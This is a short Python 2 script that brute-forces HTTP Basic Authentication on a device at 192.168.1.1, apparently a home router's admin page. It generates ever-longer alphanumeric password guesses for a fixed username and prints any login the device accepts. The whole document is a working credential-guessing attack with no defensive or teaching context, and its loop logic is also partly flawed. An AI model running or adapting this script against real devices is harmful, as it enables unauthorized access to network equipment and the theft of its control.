import httplib
import requests

'''
conn = httplib.HTTPConnection("192.168.1.1")
conn.request("HEAD","/")
res = conn.getresponse()
'''

yourList = ['0','1','2','3','4','5','6','7','8','9']
for x in xrange(97,123):
	yourList.append(chr(x))

print yourList

newList = []

for x in yourList:
	for y in yourList:
		newList.append(x+y)


# print newList
count = 0

for i in xrange(10):
	passwordList = []
	for x in yourList:
		for y in newList:
			passwordList.append(x+y)
	newList = passwordList
	for password in passwordList:
		r = requests.get("http://192.168.1.1", auth=('26346127',password))
		if r.status_code == 401:
			count += 1
			print '.',
			pass
		else:
			print 'Username : 26346127'
			print 'Password : '+password
			break
		

